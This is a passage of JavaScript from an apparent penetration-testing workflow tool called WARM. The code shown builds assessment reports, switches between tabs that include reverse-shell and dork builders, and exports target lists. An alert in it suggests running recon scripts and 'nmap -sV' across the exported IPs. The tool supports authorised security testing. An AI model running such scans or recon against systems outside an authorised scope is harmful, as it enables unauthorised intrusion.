      'figure{margin:12px 0}img{max-width:100%;border:1px solid #ccc;border-radius:6px}',
      'figcaption{font-size:12px;color:#555;margin-top:3px}.sev{color:#b00;font-size:11px}@media print{h2{page-break-after:avoid}figure{page-break-inside:avoid}}</style>',
      '</head><body>'];
    h.push('<h1>WARM — Assessment Report</h1>');
    h.push('<div class="meta"><div>Date: ' + esc2(new Date().toISOString()) + '</div>');
    h.push('<div>Focused URL: ' + esc2(r.target_url || "(none)") + '</div><div>Focused IP: ' + esc2(r.target_ip || "(none)") + '</div>');
    var uL = lists.target_url, iL = lists.target_ip;
    if (uL && uL.items.length > 1) h.push('<div>All URLs: ' + esc2(uL.items.map(function (u, i) { return u + (i === uL.focus ? " (focused)" : ""); }).join(", ")) + '</div>');
    if (iL && iL.items.length > 1) h.push('<div>All IPs: ' + esc2(iL.items.map(function (p, i) { return p + (i === iL.focus ? " (focused)" : ""); }).join(", ")) + '</div>');
    h.push('<div>Authorized scope: ' + esc2(scopeList().join(", ") || "(none set)") + '</div></div>');
    M.phases.forEach(function (ph, pi) {
      h.push('<h2>' + esc2(ph.num + " · " + ph.title) + '</h2><ul class="ck">');
      ph.items.forEach(function (it, ii) { h.push('<li>' + (checks[cid(pi, ii)] ? "☑" : "☐") + ' ' + esc2(it.label) + (it.sev ? ' <span class="sev">(' + esc2(it.sev) + ')</span>' : '') + '</li>'); });
      h.push('</ul>');
      if ((notes[ph.id] || "").trim()) h.push('<pre class="notes">' + esc2(notes[ph.id].trim()) + '</pre>');
      shotsFor(ph.id).forEach(function (s) { h.push('<figure><img src="' + s.dataUrl + '" alt="">' + (s.caption ? '<figcaption>' + esc2(s.caption) + '</figcaption>' : '') + '</figure>'); });
    });
    h.push('</body></html>');
    return h.join("");
  }
  function download(name, text, type) {
    var blob = new Blob([text], { type: type || "text/plain" }), url = URL.createObjectURL(blob);
    var a = el("a"); a.href = url; a.download = name; document.body.appendChild(a); a.click(); document.body.removeChild(a);
    setTimeout(function () { URL.revokeObjectURL(url); }, 1000);
  }

  // ---- tabs ----
  function showTab(name) {
    ["methodology", "revshells", "dorks", "setup", "favorites"].forEach(function (t) {
      var sec = $("#tab-" + t); if (sec) sec.hidden = (t !== name);
      var btn = document.querySelector('.tab[data-tab="' + t + '"]'); if (btn) btn.classList.toggle("active", t === name);
    });
    LS.set(K.tab, name);
    if (name === "favorites") buildFavorites();
  }

  // ---- theme ----
  function applyTheme(t) { if (t === "light" || t === "dark") document.documentElement.setAttribute("data-theme", t); else document.documentElement.removeAttribute("data-theme"); }
  var theme = LS.get(K.theme, "system"); applyTheme(theme);

  // ---- init ----
  document.addEventListener("DOMContentLoaded", function () {
    buildScope(); buildPhases(); buildRevshells(); buildDorks(); buildSetup(); buildFavorites(); buildXssPlanner();
    rerender(); updateProgress(); updateFavCount();
    openShotDB(function () { renderAllShots(); });  // load saved screenshots once IndexedDB is ready
    document.querySelectorAll(".tab").forEach(function (b) { b.addEventListener("click", function () { showTab(b.dataset.tab); }); });
    showTab(LS.get(K.tab, "methodology"));
    $("#reset").addEventListener("click", function () {
      if (!window.confirm("Clear all checkboxes and notes? (scope + favorites are kept)")) return;
      checks = {}; notes = {}; LS.set(K.checks, checks); LS.set(K.notes, notes);
      buildPhases(); rerender(); updateProgress();
    });
    $("#export").addEventListener("click", function () {
      var host = (resolved().target_host || "target").replace(/[^\w.-]/g, "_");
      download("warm-report-" + host + "-" + Date.now() + ".md", buildReport(), "text/markdown");
    });
    $("#export-html").addEventListener("click", function () {
      var host = (resolved().target_host || "target").replace(/[^\w.-]/g, "_");
      download("warm-report-" + host + "-" + Date.now() + ".html", buildReportHTML(), "text/html");
    });
    // export the Scope target lists as flat files the recon scripts iterate (one per line)
    $("#export-targets").addEventListener("click", function () {
      var uL = lists.target_url, iL = lists.target_ip;
      var urls = (uL && uL.items ? uL.items : []).map(function (s) { return String(s).trim(); }).filter(Boolean);
      var ips = (iL && iL.items ? iL.items : []).map(function (s) { return String(s).trim(); }).filter(Boolean);
      if (!urls.length && !ips.length) { window.alert("No targets in Scope yet. Add Target URLs/IPs first."); return; }
      if (urls.length) download("target_urls.txt", urls.join("\n") + "\n", "text/plain");
      if (ips.length) setTimeout(function () { download("target_ips.txt", ips.join("\n") + "\n", "text/plain"); }, 350);
      window.alert("Saved " + urls.length + " URL(s) + " + ips.length + " IP(s).\nMove them into your warm/ dir, then:\n  ./scripts/recon-all.sh            # recon every URL\n  ./scripts/run-targets.sh target_ips.txt 'nmap -sV {t}'");
    });
    $("#theme").addEventListener("click", function () {
      theme = theme === "system" ? "light" : theme === "light" ? "dark" : "system";
      LS.set(K.theme, theme); applyTheme(theme); $("#theme").textContent = "Theme: " + theme;
    });
    $("#theme").textContent = "Theme: " + theme;
    // favorites: custom add + export/import
    $("#fav-add").addEventListener("click", function () {
      var t = $("#fav-tool").value.trim() || "cmd", c = $("#fav-cmd").value.trim();
      if (!c) return;
      favs.push({ id: uid(), tool: t, tmpl: c }); LS.set(K.favs, favs);
      $("#fav-tool").value = ""; $("#fav-cmd").value = ""; buildFavorites();
    });
    $("#fav-export").addEventListener("click", function () { download("warm-favorites.json", JSON.stringify(favs, null, 2), "application/json"); });
    $("#fav-import").addEventListener("change", function (e) {
      var file = e.target.files[0]; if (!file) return;
      var rd = new FileReader();
      rd.onload = function () {
        try {
          var arr = JSON.parse(rd.result);
          if (Array.isArray(arr)) {
            arr.forEach(function (f) { if (f && f.tmpl && !favs.some(function (x) { return x.tmpl === f.tmpl; })) favs.push({ id: uid(), tool: f.tool || "cmd", tmpl: f.tmpl }); });
            LS.set(K.favs, favs); buildFavorites();
          }
        } catch (err) { window.alert("Could not parse that file as WARM favorites JSON."); }
        e.target.value = "";
      };
      rd.readAsText(file);
    });
  });
})();
